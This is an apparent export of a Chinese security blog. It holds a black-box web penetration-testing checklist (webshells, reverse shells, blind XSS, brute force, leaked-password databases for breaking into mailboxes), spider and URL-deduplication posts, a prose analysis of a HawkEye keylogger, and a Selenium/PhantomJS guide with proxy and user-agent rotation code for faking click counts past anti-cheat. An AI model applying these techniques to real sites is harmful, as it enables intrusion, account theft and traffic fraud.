    <entry>
      <title><![CDATA[黑盒漏洞挖掘（WEB篇）]]></title>
      <url>/pentest/2017/11/13/pentest-for-blackbox/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#DAA520;"><strong>在安全测试中，我们常常会遇到一些重复性工作。而鄙人记性不佳，有时候并不能高效的进行工作。因此，自己萌生了撰写工作总结的想法，将以往的工作列清单，做一个总结，以作查阅之用。</strong></span>
</p>

<p>当然，这个系列也希望会持续更新。人，总是要有进步不是。</p>

<h3 id="克敌机先">克敌机先</h3>

<p>在测试某个网站时，我们常常需要先探测该网站的基本信息：</p>

<ul>
  <li>是否存在WAF，像创宇盾这种检测到攻击会马上暂时性封IP，阿里云盾偷偷摸摸检测到攻击行为后，会直接无前兆地封禁你IP，至于安全狗、D盾、云锁、百度云安全这种就不一一例举了，暂时不细说。</li>
  <li>路径扫描，如果存在WAF或者目标较为脆弱，可以直接调整为非常低的线程数，比如一个线程，然后对目标进行文件/目录低速探测。如果没有太多限制，那就使劲儿造作。</li>
  <li>如果需要测试的网站比较大且比较耐操，且没有WAF/IDS，建议配置好去重和线程，使用大型扫描器对网站进行探测。这样做的好处是不会漏掉一些常用的漏洞，而且可以获取网站的结构。但缺点是需要等待比较长的时间，也容易被管理发现。</li>
  <li>部分网站的后台，可能存在于域名的其他端口上。如果服务器不存在CDN，这时候可以借助类nmap的扫描器来探测端口开放情况，比如使用命令：
```
nmap -sS -sV -p- –script=”http-title,banner” 192.168.2.10</li>
</ul>

<p>```</p>
<ul>
  <li>插件检测server类型，是否为tomcat/jboss/glassfish之类，探测是否存在可访问webserver console。</li>
  <li>检测网站是否为公开的CMS，探测CMS类型，漏洞库是否存在相关漏洞。</li>
  <li>查看有无列目录的权限。</li>
  <li>查看是否提供附件下载，如果是参数传递的URL，这类链接通常比较敏感。如果可以明显给出了文件的相对/绝对路径/可预测的类文件名id，我们可以优先进行任意文件下载测试，其次再进行常规漏洞测试。如果仅仅是给出了普通的id值，那可以直接进行常规漏洞测试。</li>
  <li>查看网站是否有明显的配置漏洞，比如提供了allow *的crossdomain.xml；没有进行过滤的robots.txt；容易猜测名字的源码压缩包；泄露敏感信息的配置文件、JS文件甚至普通html文件；.git/.svn文件供下载等。</li>
</ul>

<h3 id="权限权限">权限，权限！</h3>

<p>在遇到某个网站时，窃以为应该先寻找能够获取更大权限的地方，而登录后的权限无疑会更大。</p>

<p>这时，我们可以尝试进行注册，或者夺取原有的账户权限。</p>

<p>此时有一点需要注意，在登录的入口处和搜索处，可能存在一定的脆弱性，建议同其他前台产生的敏感数据包一同进行fuzz检测。</p>

<h5 id="自给自足">自给自足</h5>

<p>在本身无权限时，我们可以去寻找注册的地方，间接获取更高的权限。
同时在此过程中，我们有几个点需要注意：</p>

<ul>
  <li>研究找回密码功能，查看是否有无逻辑漏洞可以跳过，可否预测和爆破验证码。</li>
  <li>可能存在上传，查看能否直接获取webshell</li>
  <li>可能存在XSS，如果在注册能直接通过时，需要等待注册完毕，去用户中心再继续测试。如若需要等待审核，可以尝试植入XSS平台代码，等待机器上线。</li>
  <li>如若存在手机和邮箱验证，可尝试有无邮箱炸弹漏洞。</li>
</ul>

<h5 id="鸠占鹊巢">鸠占鹊巢</h5>

<p>有时候管理或者开发不够细心，我们可以通过各种手段去获取原有普通用户或者管理用户的权限。在我们能够比较容易的获取后台登陆口，或者在无法注册用户时，我们可以如此操作：</p>

<ul>
  <li>通过手工猜测密码/识别简单验证码/验证码绕过/直接爆破，猜测密码，来获取原有用户的权限。</li>
  <li>查看用户名是否存在，尝试能否预测/枚举用户，可能有机会猜测管理账号。</li>
  <li>搜寻文档，后台页面可能存在一些敏感说明文档提供下载，里面有可能会记录测试账号等敏感内容，对测试会比较有帮助。</li>
  <li>万能密码绕过，这种情况一般asp和php类型的网站会存在的稍微多些，不过新一点的网站这样的问题越来越少了。</li>
  <li>禁用JS，直接卡入后台管理页面。这种情况一般需要预先爆破或者在JS源码里找寻后台路径，然后再使用该方法。</li>
  <li>工具/插件修改cookie，直接进入管理后台。这种方法比较古老了，现在成功的几率是比较小的。</li>
  <li>善用类Google/类Github/类shodan引擎，搜寻泄露的后台账号密码/带认证的链接等等。</li>
  <li>设法找寻网站管理和开发者的相关信息，查找社工库组合相关密码。如果是针对企业和组织进行渗透，可设法查询社工库里相关的邮箱密码，再借助可登入的邮箱翻看敏感内容，从而达到进入后台的目的。</li>
</ul>

<h3 id="用户中心">用户中心</h3>

<p>登入网站用户中心后，我们一般可以做如下测试。</p>

<ul>
  <li>抓包测试，查看在数据包中修改参数，能否越权枚举和修改用户的基本信息/订单/地址等内容。</li>
  <li>在用户互发私信功能处，可能存在存储型XSS。</li>
  <li>如若在注册时，并未测试存储XSS、邮箱/手机/私信炸弹、越权修改密码，可在此测试。</li>
  <li>查看是否存在附件上传/头像上传，文件命名规律也可稍作检查，最后查看能否直接获取webshell。</li>
  <li>查看搜索功能是否有别于前台，能否间接枚举用户或者手机号。</li>
  <li>在用户中心进行SQL注入和XSS的fuzz测试，成功几率大抵会高于前台。</li>
  <li>对于邀请注册/登出系统/登录跳转/注册验证的链接，都可能存在任意URL跳转的漏洞。</li>
  <li>如果用户中心未启用token验证，在修改密码/修改用户名和昵称/修改地址/修改邮箱和手机号等地方，很可能存在CSRF漏洞。</li>
  <li>上传后的地址可能存在列目录漏洞。</li>
</ul>

<h3 id="管理后台">管理后台</h3>

<ul>
  <li>管理后台可能存在上传的地方，可以尝试能否获取webshell。</li>
  <li>上传处，如若能上传文本类型文档，查看是否有预览功能，进而考虑能否写入存储型XSS。</li>
  <li>上传处，如果能够上传XML文档，或者只是提交XML内容，可以尝试XXE攻击。</li>
  <li>上传处，如果过滤了大多数动态文件，但并不是使用的白名单，可以考虑上传shtml，同样可能执行命令。</li>
  <li>配置处可能存在未过滤的地方，可以直接写入存储型XSS。</li>
  <li>php类的网站，有的可以通过转义和截断，往配置文件里写入webshell。</li>
  <li>asp类的网站，可以通过写配置，然后数据库备份得到webshell，这里不细说。</li>
  <li>后台大多验证不严，可以尝试SQL注入和XSS的fuzz测试。</li>
  <li>后台可能存在执行命令的地方，可进行fuzz，获取敏感配置或者直接反弹shell。</li>
  <li>如若后台存在通讯录，在不违反合规条款的情况下，可尝试自行处理。</li>
  <li>部分后台如果存在管理用户表，在不违反合规条款的情况下，可尝试自行处理。</li>
  <li>管理后台大概率不会验证token的，所以很多网站后台也因此存在CSRF。</li>
  <li>如果非管理用户，也可以尝试越权修改其他用户的密码。</li>
  <li>后台有时会存在读取文件内容，或者探测内网存活的功能，抑或是上传特殊文件进行解析，可以尝试是否存在SSRF。</li>
</ul>

<h3 id="权宜之计">权宜之计</h3>

<p>如果我们无法登陆后台，也无法注册怎么办？我们可以尝试以下几种做法：</p>

<ul>
  <li>评论处可能存在上传和存储型XSS，也可能存在没有验证重复提交的CSRF。</li>
  <li>提交个人建议等供审核的内容时，有可能后台没有做XSS过滤，这时候就可以进行盲打。</li>
  <li>某些用户的个人页面可以通过枚举id获得，里面可能存在一些敏感信息。</li>
  <li>在前台或者用户中心，可能存在星号隐藏一些敏感信息，比如说手机号。这些信息在某些时候，可能在源码里直接或者间接能看到。</li>
  <li>前台可能存在一些伪静态页面，建议随手尝试注入，虽然现在这样的案例已经比较少了。</li>
  <li>在尝试列目录漏洞时，可以在目录后面加上XSS字符尝试是否有反馈，也可以尝试不存在的文件名（hacksb.php）或者错误的文件名（~list.aspx、error.jspx）进行报错。</li>
</ul>

<h3 id="端口入侵">端口入侵</h3>

<ul>
  <li>某些端口存在服务认证，如果有弱口令/默认口令，可以爆破进入。</li>
  <li>某些WebServer在特定端口，同样存在单独的WEB登陆口，如果突破进入后台，可以部署包拿webshell，也可能执行命令反弹shell。</li>
  <li>代理端口，这类服务比较少，如果找到可以尝试连接，设法将其作为跳板，切入内网。</li>
  <li>特定端口开启的服务，可能存在RCE，结合MSF可以反弹shell。</li>
</ul>

<h3 id="细节思考">细节思考</h3>

<ul>
  <li>测试敏感点注入时，最好多尝试几遍，加上risk、level、random-ua以及tamper，不要过于依赖扫描器或者fuzz工具。</li>
  <li>测试XSS的时候，最好先用字符试水查看过滤情况，有时候不能直接使用payload的时候，可以尝试绕过。</li>
  <li>上传时可能存在黑/白名单时，每次手动改包会很麻烦。最好是通过字典批量发包进行fuzz。另外，%00不管用时，可以替换成类似的空白字符段（以后补上细节）。</li>
  <li>绕过逻辑改包，无论是上传还是找回密码，记得每步截图，也许有时候只有一次机会。</li>
  <li>修改状态码时，也许能够通过辅助插件，自动化fuzz判断。</li>
  <li>调用callback内容时，其内容也许可控，我们可以尝试往里面注入污染语句。最后，再尝试寻找调用callback的地方。</li>
  <li>找后台一般有几种情况，可以是子目录，也可以是同域名下其他端口，甚至是其他子域名。比如统一SSO登录的情况下，一套网站总会有一个唯一入口。但由于历史的原因，总会遗漏和不统一的地方，那就是我们的突破口。</li>
  <li>待续。</li>
</ul>
]]></content>
      <categories>
        
          <category> pentest </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[域名采集爬虫]]></title>
      <url>/spider/2017/10/19/domain-spider/</url>
      <content type="html"><![CDATA[<p>
    <span style="color:#00B050;"><strong>
    前段时间在研究扫描器的问题，在涉及域名采集这块时， 突然有了一些特别的想法，所以单独将这个模块提取出来，做成了一套独立系统。
    </strong></span>
</p>

<p>对于域名采集技术，市面上大概有这样几种：</p>

<ul>
  <li>DNS域传送泄露</li>
  <li>接口查询（包括aizhan，shodan等）</li>
  <li>字典枚举</li>
  <li>Github泄露</li>
  <li>搜索引擎泄露</li>
  <li>SSL/TLS证书泄露</li>
  <li>DNS历史记录泄露</li>
  <li>置换扫描枚举法</li>
  <li>互联网自治系统号码(ASN)枚举</li>
  <li>NSEC记录枚举</li>
  <li>互联网项目数据集枚举</li>
</ul>

<p>不过这里要谈的显然不是这种，尽管自研的扫描器里已经集成了前面说的这些，今天的主角是域名采集爬虫。</p>

<p>那么何谓域名采集爬虫呢，其实也是老概念。我们要先从一个URL或者多个URL入口进行爬取。在开始，需要设定好爬行深度和允许爬行的根域名，通过不断地迭代存取和过滤，直到爬取完所有可触及的域名为止。</p>

<p>这样的域名采集方法，较其他技术优势在于：</p>

<ul>
  <li>能采到不被搜索引擎收录的可用域名。</li>
  <li>囊括范围广，除去CDN影响，能更多地去收集目标资产。</li>
  <li>细致入微，在域名采集普及的时代，厂商一般子域名都会多加注意起名，这样做能多收获一些隐藏域名。</li>
  <li>可分布式，相对于普通的单机大字典爆破，可以选择性节省更多的时间。</li>
</ul>

<p>当然讲了这么多，其劣势也很明显：</p>

<ul>
  <li>将耗费更多的时间和各类资源，即使采用了分布式，由于需要考虑部分目标主机的脆弱性，建立的连接数还是有限的。</li>
  <li>容易被封，WAF和各种IDS的规则在检测到爬虫后，可能会直接封禁IP，不过这点可以通过技术手段缓解。</li>
  <li>不易部署，相对于常用的域名接口查询和爆破，这点的劣势还是相当明显的。</li>
  <li>比较鸡肋，没有太多Team会专门为了爬取域名单独建立一个可用的爬虫体系，一般是扫描器只兼容了传统接口。</li>
</ul>

<p>优劣对比还是比较明显的，这里不多做探讨，下面纯技术介绍。</p>

<p>这里的系统采用的是scrapy+django+mongodb，每采集好一批数据后，将存入mongodb，其中的数据包括：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>页面源URL
子域名
根域名

</code></pre>
</div>

<p>后续其他项目将会解析生成的所有子域名，最后再进行资产汇总计算。这些本不属于此项目，不再细说。</p>

<p>另外，在采集过程中，爬虫会在中间件（合规的做法如此，笔者则是直接在爬虫文件里进行的过滤），根据条件过滤重复和不合规的URL。</p>

<p>代码其实很简单，现在已有的是前台查询+后台爬虫（命令行）的形式。后期如果项目可用，会加上前台scrapyd发布任务+MMQ分布式队列缓存。</p>

<p>另外，以后也考虑集成传统接口、泄露查询和枚举模块。</p>

<p>至于为啥现在没有做，因为懒。</p>

<p>代码由于还需要优化，暂时没有放出，以后会补上。</p>

<p>待续。</p>
]]></content>
      <categories>
        
          <category> spider </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[爬虫去重优化]]></title>
      <url>/spider/2017/10/14/url-duplicate-removal/</url>
      <content type="html"><![CDATA[<p>
    <span style="color:#DAA520;"><strong>以前在做漏洞Fuzz爬虫时，曾做过URL去重相关的工作，当时是参考了seay法师的文章以及网上零碎的一些资料，感觉做的很简单。近来又遇到相关问题，于是乎有了再次改进算法的念头。</strong></span>
</p>

<p>首先，针对URL本身的去重，可以直接对整块URL进行处理。在参考网上的一些文章时，发现它们大多做了URL压缩存储。使用这些算法在数据量较大的时候，诚然能大幅减小存储的空间：</p>

<ul>
  <li>
    <p>基于磁盘的顺序存储。</p>
  </li>
  <li>
    <p>基于Hash算法的存储。</p>
  </li>
  <li>
    <p>基于MD5压缩映射的存储。</p>
  </li>
  <li>
    <p>基于嵌入式Berkeley DB的存储。</p>
  </li>
  <li>
    <p>基于布隆过滤器（Bloom Filter）的存储。</p>
  </li>
</ul>

<p>而对于URL逻辑上的去重，这里先给出seay文章中的相似度去重算法，大致是下面这样的：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>def urlsimilar(url):
        hash_size=199999
        tmp=urlparse.urlparse(url)
        scheme=tmp[0]
        netloc=tmp[1]
        path=tmp[2][1:]
        query=tmp[4]
        #First get tail
        if len(path.split('/'))&gt;1:
            tail=path.split('/')[-1].split('.')[-1]
            #print tail
        elif len(path.split('/'))==1:
            tail=path
        else:
            tail='1'
         #Second get path_length
        path_length=len(path.split('/'))-1
        #Third get directy list except last
        path_list=path.split('/')[:-1]+[tail]
        #Fourth hash
        path_value=0
        for i in range(path_length+1):
            if path_length-i==0:
                path_value+=hash(path_list[path_length-i])%98765
            else:
                path_value+=len(path_list[path_length-i])*(10**(i+1))

        #get host hash value
        netloc_value=hash(hashlib.new("md5",netloc).hexdigest())%hash_size
        url_value=hash(hashlib.new("md5",str(path_value+netloc_value)).hexdigest())%hash_size

        return url_value
</code></pre>
</div>
<p>这段函数的大概作用是，最后它会根据算法返回一个hash值，这个hash值也就是该URL的hash相似度。如果两个URL计算出的hash值最后比较相等，我们则可以判断两个URL是具有较高的相似度的。</p>

<p>但是这个函数应该是seay举例时随手提出的（这里强调下，免得被喷，后文不再细说），只是简单做了demo，并没有进行细化检验。在比较粗糙的情况下，该算法确实能剔除一些简单的参数重复的情况，但一旦参数复杂或者url不规范，是不太能很好的进行去重的。</p>

<p>那么在针对URL获取的过程中，我们还可以做的小优化有哪些呢？</p>

<h3 id="日期时间命名">日期时间命名</h3>
<p>首先，我们可以根据日期来去重。我们知道，在爬取一些Blog和和门户等系统时，经常会遇到以日期命名的目录。</p>

<p>这些目录大概归纳起来，存在类似下面的形式：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>
2010-11-11
10-11-11
20101111

</code></pre>
</div>
<p>当然，还有些文件会以时间+随机值命名，也可能是用unix时间戳命名，这些可能是根据上传和编辑时间来定义的。</p>

<p>笔者建议是，使用redis或者memcache之类等缓存型数据库，将其直接存储;或者在数据大的时候，考虑作为临时hash set存储。</p>

<p>比如，一旦出现日期时间命名的目录或静态文件，我们可以将其URL地址作为样本存储在数据库里，存储的内容可以是：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>目录层级
命名格式
URL地址(或hash值)

</code></pre>
</div>
<p>有人可能说，在前面seay提出的那个案例里，好像是可以解决类似日期相似度的问题。那我们先看看下面的例子，此处输出仍然基于上面那个函数：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>print urlsimilar('http://www.baidu.com/blog/2010-10-11/')
print urlsimilar('http://www.baidu.com/blog/2010-10-13/')
print urlsimilar('http://www.baidu.com/blog/2010-9-13/')
print urlsimilar('http://www.baidu.com/whisper/2010-10-11/')
</code></pre>
</div>
<p>输出结果如下：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>110086
110086
37294
4842

</code></pre>
</div>
<p>我们可以看到，在普通情况下，确实于相同父级目录下，相似度算法是可以判断正确的。
但是一旦日期格式不规范，或者父级目录存在一定的差异，这里是不能很好的判断的。</p>

<p>当然，我们也可以通过机器学习来完成去重的工作。不过就简化工作而言，还是可以使用一些小Tips，根据规则匹配来做到。</p>

<h3 id="静态文件的去重">静态文件的去重</h3>

<p>我们知道，在爬取URL的过程中，也会遇到许多静态文件，如shtml、html、css等等。这些文件在大多数的情况下，是没有太大意义的。除非测试者倾向于使用“宁可错杀一百，绝不放过一个”的全量采集手法。</p>

<p>这时候，我们可以配置黑名单，建立文件后缀规则库进行过滤。</p>

<p>当然，在这些静态后缀的URL链接，也可能带上参数混淆的情况。
个人建议是，用于回调的json、xml等URL，里面可能储存敏感内容，尽量别动；其他类型的静态文件，仍然采取将参数分离的方式，最后对URL进行去重存储。</p>

<h3 id="特定情况的过滤">特定情况的过滤</h3>

<p>在爬取特定网站时，我们可以预先做好配置，指定过滤一些目录和页面，以节省大量时间资源。</p>

<p>反过来，我们也可以指定只爬取指定目录下的页面，定向获取我们想要的内容。</p>

<h3 id="敏感页面的感知">敏感页面的感知</h3>

<p>在seay提出的demo算法中，是有一定局限的。比如我们需要在敏感目录下，尽可能多的拿到文件信息。比如我们爬取到了后台管理目录，可能会遇到下面的情况：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>print urlsimilar('http://www.baidu.com/blog/admin/login.php')
print urlsimilar('http://www.baidu.com/blog/admin/manage_index.php')
print urlsimilar('http://www.baidu.com/blog/admin/test.css')

</code></pre>
</div>

<p>输出结果如下：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>40768
40768
40768
</code></pre>
</div>
<p>很明显有问题不是么？</p>

<p>当然，我们可以通过对敏感页面关键词进行监控；或者也可以指定后缀文件，进行白名单监控。</p>

<p>但是一旦这样做，而且还想采用前面的hash算法的话，大家定义的过滤函数的优先级，肯定需要大于该算法。并且，我们在这样做的过程中，也应该考虑过滤成本的问题，建议采用选择性启用。</p>

<h3 id="高频敏感目录的优待">高频敏感目录的优待</h3>

<p>可能在爬取的过程中，部分爬虫是并用了目录爆破的手段的。如果采用了这种手法并且匹配成功后，我们可以将该目录下的内容单独使用一份过滤规则，从而避免去重算法的误判。</p>

<h3 id="响应页面的过滤">响应页面的过滤</h3>

<p>对于某些网站来讲，可能有不少页面因为链接是失效的，会被冠以404页面和50x错误。另外，在无权访问的时候，可能网站会做30x跳转和403目录限制。</p>

<p>这些页面没有实质性内容，在大多数时候是没有意义的，我们可以在配置文件里对需要爬取的这类页面做白名单，比如保留403页面，或者存取30x跳转前（后）的页面。</p>

<h3 id="waf警告页面过滤">WAF（警告）页面过滤</h3>

<p>某些网站可能被装上了WAF，在访问频率过快时，可能会得到一个WAF的警告页面。而在CMS本身就做了限制的情况下，会以20x的响应码展示一些没有不存在的页面。</p>

<p>当然，我们可以通过分布式换代理的方式，去解决部分这样的问题，这里先不多做讨论。</p>

<p>这时候，我们可以配置相应的次数阈值，如果某些页面出现的次数过多，可以将其标记为警告（WAF）页面，进而做出过滤处理。这里对某页面的识别，可以通过黑名单关键字标记，或者计算页面hash值，比如下面这样：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>content = urllib2.urlopen('http://www.test.com/').read()
md5_sum = hashlib.md5()
md5_sum.update(content)
print md5_sum.hexdigest()
</code></pre>
</div>

<p>当然，我们在实际计算页面hash值和取关键字（做分词或黑名单）时，也可能由于反爬虫机制的存在（如添加随机值），需要适时调整相似度来计算hash值或者采用其他手段。当然这也会消耗更多的时间和机器资源。但某些特定的情况下，可能也会带来意想不到的收获。</p>

<h3 id="无意义参数页面去重">无意义参数页面去重</h3>

<p>我们在采集页面的过程中，同样有可能会遇到一些毫无意义的、高频出现的、多参数页面。这类页面可能是回调页面，也可能是临时渲染的随机页面。</p>

<p>在这里，大家可以通过前面处理WAF（警告）的方法进行过滤。当然，使用前面的hash算法也是可以应对大部分情况的。毕竟网站的这类的URL有限，不必为了几种特型去消耗更多的资源，这样得不偿失。</p>

<h3 id="js代码中的url">JS代码中的URL</h3>

<p>在我们提取js代码，也就是遇到ajax之类的交互情况时，可能会遇到需要拼接的GET请求，或者直接可以取用的POST请求。</p>

<p>这类的URL地址，最好是结合phantomjs等webkit，更方便地进行动态拼接。</p>

<p>它们会显得比较特殊，可能仅仅返回状态码，也可能会返回实质性的敏感内容。这种情况，就需要根据爬取者的要求，对爬取的过滤规则进行适应性调整。</p>

<h3 id="总结">总结</h3>

<p>这里旨在提出一些对相似URL去重的小优化，可能效果有限，也可能存在未尽人意之处。欢迎大家提出建议，诸君共勉。</p>

<h3 id="参考文章">参考文章</h3>

<p>如何避免重复抓取同一个网页
https://segmentfault.com/q/1010000002664904</p>

<p>浅谈动态爬虫与去重
http://bobao.360.cn/learning/detail/3391.html</p>

<p>网络爬虫：URL去重策略之布隆过滤器(BloomFilter)的使用
http://blog.csdn.net/lemon_tree12138/article/details/47973715</p>

<p>实用科普：爬虫技术浅析 编写爬虫应注意的点
http://www.cnseay.com/?p=4102</p>

<p>网络爬虫 (spider) URL消重设计 URL去重设计
http://woshizn.iteye.com/blog/532605</p>
]]></content>
      <categories>
        
          <category> spider </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[迁移博客]]></title>
      <url>/jekyll/update/start/2017/09/02/welcome-to-jekyll/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#00B050;"><strong>最近原来的空间服务里到期了，钱包吃紧又想diy，最后就选择了转入Github page。</strong></span>
</p>

<p>在转入时遇到了许多坑，尤其是在ruby gem安装时老遇到依赖问题，下载没代理也老卡住。</p>

<p>好不容易弄好后，本来想自己改个简单的主题将就用下。结果又遇到分页和一系列插件配置问题，搞得头都大了。</p>

<p>作为一名老年选手差点崩溃，最后无奈下了个Jekyll主题，稍微改下就全部搞定了。</p>

<p>好吧，以前用CMS差点被人搞，这次全静态，could you tell me how to play with it?</p>

<p>If you can…</p>

<p>Dalao,  ball dai fly…</p>

]]></content>
      <categories>
        
          <category> jekyll </category>
        
          <category> update </category>
        
          <category> start </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Selenium+phantomjs刷量]]></title>
      <url>/spider/2016/11/12/seleniumphantomjs-e5-88-b7-e9-87-8f/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#DAA520;"><strong>最近有这方面的需求，要帮人在某网站上刷点击量。由于该网站是一家比较知名的大型门户，反作弊机制肯定是有的，所以突发奇想用Selenium试试。</strong></span>
</p>

<p>
	与Selenium类似的东西有lxml，它们采用正则xpath路径匹配标签会多一些。当然，也有人会使用beautifulsoup4去解析网页结构，最后再得到需要的标签。达成目的的路不止一条，这点不再赘述。
</p>

<p>
	本来想用Selenium随便找个浏览器模拟人的浏览网页行为，结果每次需要重新打开一次浏览器，几乎让人抓狂。最后还是采用了phantomjs，这是一种后台浏览器，同样满足模拟行为。
</p>

<p>
	这里提一下，Selenium需要跟浏览器版本的更新度一致。本来我采用的firefox28.0+Selenium3.01,结果踩了半天坑没找到原因。最后，将火狐更新到最新版47.01才解决。
</p>

<p>
	像这类调度，我发现的大概需要注意的有两点：
</p>

<p>
	第一：他们都需要有个浏览器调用的中间件【windows下举例】：
</p>

<p>
	<span style="color:#FF0000;">比如phantomjs.exe（同类的有chromedriver.exe【谷歌】、geckodriver.exe【火狐】），这些需要放在python环境的script目录下。</span>
</p>

<p>
	第二：浏览器需要装在默认目录：
</p>

<p>
	<span style="color:#FF0000;">当然在浏览器目录添加系统环境变量（PATH）也是可以的，这个不是默认添加的，否则会报错。</span>
</p>

<p>
	<span style="color:#000000;">完成了这些工作以后，我们就可以后台对</span>Selenium进行调度了，另外phantomjs具有JS特性，自然也是可以对后台加载的网页进行一些诸如定位、拖动滚动条之类的操作。
</p>

<p>
	比如下面这段代码片段【案例来自于网络】：
</p>

<pre class="brush:python;">
&nbsp; &nbsp; driver.get(pageURL)&nbsp;
&nbsp; &nbsp; js1 = &#39;return document.body.scrollHeight&#39;
&nbsp; &nbsp; js2 = &#39;window.scrollTo(0, document.body.scrollHeight)&#39;
&nbsp; &nbsp; old_scroll_height = 0
&nbsp; &nbsp; while(driver.execute_script(js1) &gt; old_scroll_height):
&nbsp; &nbsp; &nbsp; &nbsp; old_scroll_height = driver.execute_script(js1)
&nbsp; &nbsp; &nbsp; &nbsp; driver.execute_script(js2)
&nbsp; &nbsp; &nbsp; &nbsp; time.sleep(1) &nbsp;</pre>

<p>
	我们刷流量嘛，自然需要代理。这个可以在网上买，大概5块几千个没问题，不保证稳定性。当然，你去其他免费代理网站爬下来也是可以的。
</p>

<p>
	设置代理的法子大概写一下【案例来自于网络】：
</p>

<pre class="brush:python;">
service_args = [
 &#39;--proxy=127.0.0.1:9999&#39;,
 &#39;--proxy-type=socks5&#39;,
 ]
driver = webdriver.PhantomJS(&#39;../path_to/phantomjs&#39;,service_args=service_args)</pre>

<p>
	UA在放在list池子里，需要的时候自行启用：
</p>

<pre class="brush:python;">
from random import choice</pre>

<p>
	header里设置UA【案例来自于网络】：
</p>

<pre class="brush:python;">
from selenium import webdriver
from selenium.webdriver import DesiredCapabilities
driver=webdriver.PhantomJS(executable_path=&#39;存放路径\phantomjs.exe&#39;)
desired_capabilities= DesiredCapabilities.PHANTOMJS.copy()
headers = {&#39;Accept&#39;: &#39;*/*&#39;,
&#39;Accept-Language&#39;: &#39;en-US,en;q=0.8&#39;,
&#39;Cache-Control&#39;: &#39;max-age=0&#39;,
&#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36&#39;,#这种修改 UA 也有效
&#39;Connection&#39;: &#39;keep-alive&#39;
&#39;Referer&#39;:&#39;http://www.baidu.com/&#39;
}
for key, value in headers.iteritems():
    desired_capabilities['phantomjs.page.customHeaders.{}'.format(key)] = value
desired_capabilities['phantomjs.page.customHeaders.User-Agent'] = &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36&#39;
driver= webdriver.PhantomJS(desired_capabilities=desired_capabilities)
driver.get(&quot;http://www.myip.cn/judge.php&quot;)
print driver.page_source</pre>

<p>
	其他涉及具体细节的，这里就不多谈了，网上很多。
</p>

<p>
	我这里也是临时用下，没有太高深的技术。希望对某些朋友有帮助，Good luck!
</p>

<p>
	<strong><span style="color:#FFD700;">[转载请注明来源</span><a href="http://blog.hellsec.net/" target="_blank"><span style="color:#FFD700;">本站</span></a><span style="color:#FFD700;">,谢谢。]</span></strong>
</p>

]]></content>
      <categories>
        
          <category> spider </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[看我如何从邮箱附件的逆向分析到揪出黑客源头]]></title>
      <url>/translate/2016/07/06/e7-9c-8b-e6-88-91-e5-a6-82-e4-bd-95-e4-bb-8e-e9-82-ae-e7-ae-b1-e9-99-84-e4-bb-b6-e7-9a-84-e9-80-86-e5-90-91-e5-88-86-e6-9e-90-e5-88-b0-e6-8f-aa-e5-87-ba-e9-bb-91-e5-ae-a2-e6-ba-90-e5-a4-b4/</url>
      <content type="html"><![CDATA[<p><strong><span style="color: #00B050;">这个故事要从一次垃圾邮件攻击事件说起，下图是一个笔者从某封垃圾邮件里提取的可疑附件。至于下面这蹩脚的英语，这也是值得我们注意的地方。</span></strong></p>

<p>上图的附件使用了“.doc”作为后缀，但它其实是RTF（富文本）格式的文件。该文件包含了一个针对性的RTF栈溢出exp，它利用了CVE-2010-3333，也就是在微软Word RTF解析器在处理pFragments时会产生的一个漏洞。然而，该漏洞在五年前就已经修补了。</p>

<p>正如你在上图中看到的那样，该exp和shellcode做了混淆来逃避杀软的检测。经过各种提取整理解密之后，笔者发现该shellcode会从volafile.io上面下载文件来执行。</p>

<p>下载下来的这个文件是微软.net Win32可执行文件，简单hex dump了这个文件，笔者发现了HawkEyekeylogger字符串。</p>

<p>在谷歌后发现，它指引笔者找到了开发该键盘记录器的官网。在网站里，他们列出了该键盘记录器一些的特性。</p>

<p>在笔者动态的分析中，该键盘记录器会把自身复制一份到Application Data（%appdata%）文件夹，并且将复制后的文件命名为WindowsUpdate.exe。同时，它在注册表里设置了开机启动，以实现其持续性攻击。</p>

<p>并且，它还会在受感染的系统里释放以下文件：</p>

<p><span style="color: #ff6600;">%Temp%\Sysinfo.txt – 释放的恶意软件exe路径</span></p>

<p><span style="color: #ff6600;">%Appdata%\pid.txt –恶意软件进程ID</span></p>

<p><span style="color: #ff6600;">%Appdata%\pidloc.txt – 恶意软件进程exe路径</span></p>

<p>接着，笔者观察到该键盘记录器试图去checkip.dyndns.com，获取受感染系统的外网IP。这个合法的网站经常被恶意软件利用，拿来确定受感染系统的IP地址。</p>

<p>过了一会儿，笔者监控到了SMTP流量，发现了受感染系统发送信息给黑客email的动作。</p>

<p>里面的信息可能包括：</p>

<p><span style="color: #ff6600;">计算机名</span></p>

<p><span style="color: #ff6600;">本地日期和时间</span></p>

<p><span style="color: #ff6600;">系统语言</span></p>

<p><span style="color: #ff6600;">操作系统</span></p>

<p><span style="color: #ff6600;">平台</span></p>

<p><span style="color: #ff6600;">操作系统版本</span></p>

<p><span style="color: #ff6600;">内存</span></p>

<p><span style="color: #ff6600;">.net框架</span></p>

<p><span style="color: #ff6600;">系统权限</span></p>

<p><span style="color: #ff6600;">默认浏览器</span></p>

<p><span style="color: #ff6600;">防火墙</span></p>

<p><span style="color: #ff6600;">内网IP地址</span></p>

<p><span style="color: #ff6600;">外网IP地址</span></p>

